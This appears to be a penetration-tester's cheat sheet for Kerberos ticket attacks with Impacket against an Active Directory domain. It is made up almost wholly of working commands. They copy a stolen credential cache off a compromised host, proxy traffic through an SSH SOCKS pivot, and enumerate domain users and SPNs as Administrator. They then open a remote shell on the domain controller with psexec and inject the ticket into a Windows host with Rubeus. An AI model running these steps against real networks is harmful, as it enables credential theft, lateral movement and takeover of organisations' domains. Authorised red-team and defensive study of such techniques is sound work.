# Impacket

## Kerberos with Impacket

in order to perform ticket manipulation we need to install the kerberos linux client utilities on the kali box

```
apt install krb5-user 
```

* If you screw up the install or need to change something
  * sudo dpkg-reconfigure krb5-config
  * all values to target domain

We’ll also have to copy the ccache file previously obtained to our local Kali box

```
scp kali@targetbox:/tmp/krb5cc_minenow /tmp/krb5cc_minenow
```

Next we’ll have to update the environment variable on our local kali box

```
export KRB5CCNAME=/tmp/krb5cc_minenow
```

We’ll need to update the hosts file to map the hostnames to IP addresses

```
sudo echo '192.168.2.2 dc01.domain.com' >> /etc/hosts
sudo echo '192.168.2.2 domain.com' >> /etc/hosts
```

Also the source IP address will have to be correct so proxychains will need to be used

proxychains4.conf will need to comment out DNS

```
sed -i 's/proxy_dns/\#proxy_dns/g' dns.txt
```

set up a socks server on the pivot host

```
ssh kali@targetbox -D 9050
```

now proxychains & impacket can be used to interact with the remote host

```
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py -all -k -no-pass -dc-ip 192.168.X.Y DOMAIN.COM/Administrator
```

Gather a list of SPNs available

```
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -k -no-pass -dc-ip 192.168.X.Y DOMAIN.COM/Administrator
```

get a shell on the remote box

```
proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py Administrator@DC01.DOMAIN.COM -k -no-pass
```

Renew

```
proxychains kinit -R
```

Convert ccache to kirbi

```
./ticket_converter.py admin.ccache admin.kirbi
```

inject ticket on compromised windows box

```
.\Rubeus.exe ptt /ticket:<ticket_kirbi_file>
```
